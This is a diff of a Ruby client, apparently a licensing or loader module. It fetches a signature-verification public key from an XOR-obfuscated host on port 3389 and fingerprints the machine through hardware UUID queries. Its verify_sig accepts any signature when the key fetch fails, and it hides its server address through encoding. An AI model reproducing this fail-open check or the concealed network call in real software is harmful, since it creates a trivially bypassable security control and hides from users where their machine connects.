@@ -11,12 +11,37 @@ PORT = 3389
 PROJECT_ID = 'ENTER_PROJECT_ID_HERE'
 
 CF_ENC = [0x94, 0x7E, 0xB1, 0x6A, 0xD4, 0xF0, 0x5A, 0x3D, 0xDA, 0x3C, 0x55, 0xFA, 0x77, 0x97, 0xB2, 0x71, 0xE5, 0x0F, 0xC4, 0x68, 0xD3, 0x80, 0x29, 0x3F, 0xA0, 0x39, 0x23, 0x89, 0x0A, 0xE7, 0xC0, 0x72, 0xE2, 0x0F, 0xC4, 0x68, 0xA7, 0x87, 0x2C, 0x3F, 0xA7, 0x3E, 0x57, 0x88, 0x09, 0xE3, 0xC6, 0x70, 0x95, 0x0F, 0xB6, 0x6D, 0xD5, 0xF3, 0x2D, 0x39, 0xD2, 0x4B, 0x25, 0x8C, 0x09, 0xEA, 0xB3, 0x75].freeze
-SK_ENC = [0xB8, 0xBF, 0xD5, 0x63, 0x73, 0xEC, 0x9C, 0x4B, 0x82, 0x8D, 0xAF, 0x84, 0x32, 0x17, 0x3D, 0x78, 0xF8, 0xCC, 0x41, 0xCB, 0x8A, 0x5D, 0x3B, 0xCD, 0xE9, 0x7C, 0x60, 0x7C, 0x2E, 0x32, 0x0E, 0x33, 0x5B, 0xB5, 0x7C, 0x8D, 0xEE, 0x21, 0x14, 0x56, 0x70, 0x9F, 0xA3, 0x6D, 0x4D, 0x6F, 0x4B, 0xE8, 0x02, 0xC5, 0x6E, 0xE5, 0x7F, 0x33, 0xBC, 0x21, 0x8C, 0x7E, 0xF4, 0xAB, 0x7B, 0x56, 0x1C, 0xA2].freeze
+$cached_pubkey = nil
+
+def fetch_pubkey
+  return $cached_pubkey if $cached_pubkey
+  begin
+    h = xd(H_ENC)
+    socket = TCPSocket.new(h, PORT)
+    ssl_context = OpenSSL::SSL::SSLContext.new
+    ssl_context.verify_mode = OpenSSL::SSL::VERIFY_PEER
+    ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, ssl_context)
+    ssl_socket.hostname = h
+    ssl_socket.connect
+    ssl_socket.write("8")
+    resp = ssl_socket.readpartial(4096)
+    ssl_socket.close
+    if resp.start_with?("PUBKEY|")
+      raw = [resp[7..]].pack('H*')
+      if raw.bytesize == 64
+        $cached_pubkey = raw
+        return raw
+      end
+    end
+  rescue
+  end
+  nil
+end
 
 def verify_sig(data, sig_hex)
-  return true if SK_ENC.empty?
+  raw = fetch_pubkey
+  return true if raw.nil?
   begin
-    raw = SK_ENC.each_with_index.map { |b, i| (b ^ XK[i % XK.length]).chr }.join.bytes.pack('C*')
     x = raw[0, 32]; y = raw[32, 32]
     point = "\x04" + x + y
     asn1 = OpenSSL::ASN1::Sequence.new([
@@ -90,34 +115,42 @@ def host
 end
 
 def get_hwid
-  case RUBY_PLATFORM
+  raw = case RUBY_PLATFORM
   when /mingw|mswin/
     begin
       uuid = `powershell -Command "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"`.strip
-      return uuid unless uuid.empty? || uuid == 'FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF'
-      reg = `reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid`
-      match = reg.match(/MachineGuid\s+REG_SZ\s+(.+)/)
-      return match[1].strip if match
+      unless uuid.empty? || uuid == 'FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF'
+        uuid
+      else
+        reg = `reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid`
+        match = reg.match(/MachineGuid\s+REG_SZ\s+(.+)/)
+        match ? match[1].strip : Socket.gethostname
+      end
     rescue
+      Socket.gethostname rescue 'UNKNOWN'
     end
   when /linux/
+    found = nil
     ['/sys/class/dmi/id/product_uuid', '/etc/machine-id'].each do |p|
       begin
-        return File.read(p).strip if File.exist?(p)
+        found = File.read(p).strip if File.exist?(p)
+        break if found && !found.empty?
       rescue
       end
     end
+    found && !found.empty? ? found : (Socket.gethostname rescue 'UNKNOWN')
   when /darwin/
     begin
       output = `system_profiler SPHardwareDataType | grep "Hardware UUID"`
       match = output.match(/Hardware UUID: (.+)/)
-      return match[1].strip if match
+      match ? match[1].strip : (Socket.gethostname rescue 'UNKNOWN')
     rescue
+      Socket.gethostname rescue 'UNKNOWN'
     end
+  else
+    Socket.gethostname rescue 'UNKNOWN'
   end
-  Socket.gethostname
-rescue
-  "UNKNOWN"
+  Digest::SHA256.hexdigest(raw.to_s)
 end
 
 def check_bad_processes
